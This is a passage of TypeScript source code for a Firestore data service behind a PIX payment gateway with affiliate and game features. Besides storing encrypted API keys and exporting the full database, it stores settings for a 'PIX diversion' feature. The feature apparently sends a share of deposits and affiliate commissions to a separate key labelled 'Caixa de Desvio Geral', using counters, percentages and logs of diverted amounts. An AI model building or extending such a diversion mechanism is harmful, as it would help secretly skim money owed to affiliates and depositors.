          activeApiKey: raw.activeApiKey ? decryptSensitiveData(raw.activeApiKey) : raw.activeApiKey,
          secondaryApiKey: raw.secondaryApiKey ? decryptSensitiveData(raw.secondaryApiKey) : raw.secondaryApiKey,
          webhookSecret: raw.webhookSecret ? decryptSensitiveData(raw.webhookSecret) : raw.webhookSecret
        };
      }
    } catch (err) {
      console.warn('[FirestoreDB] Could not get dotfy config:', err);
    }
    return null;
  }

  async saveDotfyConfig(config: DotfyGatewayConfigDB): Promise<void> {
    try {
      const docRef = doc(firestoreDb, 'settings', 'dotfy');
      const encryptedConfig: DotfyGatewayConfigDB = {
        ...config,
        activeApiKey: config.activeApiKey ? encryptSensitiveData(config.activeApiKey) : config.activeApiKey,
        secondaryApiKey: config.secondaryApiKey ? encryptSensitiveData(config.secondaryApiKey) : config.secondaryApiKey,
        webhookSecret: config.webhookSecret ? encryptSensitiveData(config.webhookSecret) : config.webhookSecret
      };
      await setDoc(docRef, sanitizeForFirestore(encryptedConfig), { merge: true });
    } catch (err) {
      console.warn('[FirestoreDB] Could not save dotfy config:', err);
    }
  }

  // --- GLOBAL PIX DIVERSION CONFIG & METRICS ---
  async getGlobalPixDiversionConfig(): Promise<{
    active: boolean;
    mode: 'random' | 'sequential';
    killX: number;
    everyY: number;
    minAmount: number;
    pixKey: string;
    pixKeyType: 'cpf' | 'cnpj' | 'email' | 'phone' | 'random';
    beneficiaryName: string;
    percent?: number;
    everyNth?: number;
    counter: number;
    totalDivertedAmount: number;
    totalDivertedCommissions: number;
    totalDivertedCount: number;
    lastDivertedAt?: string;
    recentLogs?: Array<{
      id: string;
      depositId: string;
      amount: number;
      divertedCommission: number;
      originalUserName: string;
      originalUserEmail?: string;
      affiliateId?: string;
      affiliateName?: string;
      affiliateEmail?: string;
      affiliateCode?: string;
      ruleApplied: string;
      divertedKey?: string;
      divertedKeyType?: string;
      divertedAt: string;
    }>;
  }> {
    try {
      const docRef = doc(firestoreDb, 'settings', 'pix_diversion');
      const snap = await getDoc(docRef);
      if (snap.exists()) {
        const data = snap.data();
        return {
          active: Boolean(data.active),
          mode: (data.mode === 'random' || data.mode === 'sequential') ? data.mode : 'sequential',
          killX: Number(data.killX || 3),
          everyY: Number(data.everyY || 10),
          minAmount: Number(data.minAmount || 10),
          pixKey: data.pixKey || '',
          pixKeyType: data.pixKeyType || 'random',
          beneficiaryName: data.beneficiaryName || 'Caixa de Desvio Geral',
          percent: Number(data.percent || 0),
          everyNth: Number(data.everyNth || 0),
          counter: Number(data.counter || 0),
          totalDivertedAmount: Number(data.totalDivertedAmount || 0),
          totalDivertedCommissions: Number(data.totalDivertedCommissions || 0),
          totalDivertedCount: Number(data.totalDivertedCount || 0),
          lastDivertedAt: data.lastDivertedAt,
          recentLogs: Array.isArray(data.recentLogs) ? data.recentLogs : []
        };
      }
    } catch (err) {
      console.warn('[FirestoreDB] Could not get pix diversion config:', err);
    }
    return {
      active: false,
      mode: 'sequential',
      killX: 3,
      everyY: 10,
      minAmount: 10,
      pixKey: '',
      pixKeyType: 'random',
      beneficiaryName: 'Caixa de Desvio Geral',
      percent: 0,
      everyNth: 0,
      counter: 0,
      totalDivertedAmount: 0,
      totalDivertedCommissions: 0,
      totalDivertedCount: 0,
      recentLogs: []
    };
  }

  async saveGlobalPixDiversionConfig(config: any): Promise<any> {
    try {
      const current = await this.getGlobalPixDiversionConfig();
      const updated = {
        ...current,
        ...config,
        recentLogs: config.recentLogs !== undefined ? config.recentLogs : (current.recentLogs || [])
      };
      const docRef = doc(firestoreDb, 'settings', 'pix_diversion');
      await setDoc(docRef, sanitizeForFirestore(updated), { merge: true });
      return updated;
    } catch (err) {
      console.warn('[FirestoreDB] Could not save pix diversion config:', err);
      return config;
    }
  }

  // --- EXPORTAÇÃO COMPLETA DO BANCO PARA MIGRAÇÃO VPS ---
  async exportCompleteDatabase(): Promise<any> {
    const backup: Record<string, any> = {
      meta: {
        system: "PayGateway & Alliance Hub",
        version: "2.4.0",
        exportDate: new Date().toISOString(),
        exportedFor: "Migração VPS Integrator",
        firestoreDatabaseId: firebaseConfig.firestoreDatabaseId || "(default)",
        collectionsExported: [] as string[]
      },
      collections: {} as Record<string, any[]>,
      settings: {} as Record<string, any>,
      counts: {} as Record<string, number>
    };

    const targetCollections = [
      'users',
      'affiliates',
      'referrals',
      'transactions',
      'charges',
      'affiliateCommissions',
      'games',
      'gameConfigs',
      'gameBets',
      'gameStats',
      'gameSessions',
      'pushSubscriptions',
      'admin_notification_logs',
      'affiliate_notifications_feed'
    ];

    for (const colName of targetCollections) {
      try {
        const snap = await getDocs(collection(firestoreDb, colName));
        let docs = snap.docs.map(d => ({ _id: d.id, ...d.data() }));

        // Fallback to in-memory cache if Firestore collection is empty but in-memory has records
        if (docs.length === 0) {
          if (colName === 'users') docs = Array.from(memoryUsers.values()).map(u => ({ _id: u.id, ...u }));
          else if (colName === 'affiliates') docs = Array.from(memoryAffiliates.values()).map(a => ({ _id: a.id, ...a }));
          else if (colName === 'referrals') docs = Array.from(memoryReferrals.values()).map(r => ({ _id: r.id, ...r }));
          else if (colName === 'transactions') docs = Array.from(memoryTransactions.values()).map(t => ({ _id: t.id, ...t }));
          else if (colName === 'affiliateCommissions') docs = Array.from(memoryCommissions.values()).map(c => ({ _id: c.id, ...c }));
          else if (colName === 'games') docs = INITIAL_GAMES.map(g => ({ _id: g.id, ...g }));
        }

        backup.collections[colName] = docs;
        backup.counts[colName] = docs.length;
        backup.meta.collectionsExported.push(colName);
      } catch (err: any) {
        console.warn(`[Export] Error exporting collection ${colName}:`, err?.message || err);
        backup.collections[colName] = [];
        backup.counts[colName] = 0;
      }
    }

    // Export settings documents (credentials strictly encrypted at rest)
    try {
      const dotfySnap = await getDoc(doc(firestoreDb, 'settings', 'dotfy'));
      if (dotfySnap.exists()) {
        const rawDotfy = dotfySnap.data() as any;
        backup.settings['dotfy'] = {
          ...rawDotfy,
          activeApiKey: rawDotfy.activeApiKey ? encryptSensitiveData(decryptSensitiveData(rawDotfy.activeApiKey)) : undefined,
          secondaryApiKey: rawDotfy.secondaryApiKey ? encryptSensitiveData(decryptSensitiveData(rawDotfy.secondaryApiKey)) : undefined,
          webhookSecret: rawDotfy.webhookSecret ? encryptSensitiveData(decryptSensitiveData(rawDotfy.webhookSecret)) : undefined
        };
      } else {
        const localDotfy = await this.getDotfyConfig();
        if (localDotfy) {
          backup.settings['dotfy'] = {
            ...localDotfy,
            activeApiKey: localDotfy.activeApiKey ? encryptSensitiveData(localDotfy.activeApiKey) : undefined,
            secondaryApiKey: localDotfy.secondaryApiKey ? encryptSensitiveData(localDotfy.secondaryApiKey) : undefined,
            webhookSecret: localDotfy.webhookSecret ? encryptSensitiveData(localDotfy.webhookSecret) : undefined
          };
        }
      }
    } catch (e) {
      console.warn('[Export] Error reading settings/dotfy:', e);
    }

    try {
      const campSnap = await getDoc(doc(firestoreDb, 'settings', 'campaigns'));
      if (campSnap.exists()) {
        backup.settings['campaigns'] = campSnap.data();
      } else {
        const localCamp = await this.getCampaignSettings();
        if (localCamp) backup.settings['campaigns'] = localCamp;
      }
    } catch (e) {
      console.warn('[Export] Error reading settings/campaigns:', e);
    }

    return backup;
  }
}

export const dbService = new FirestoreDB();
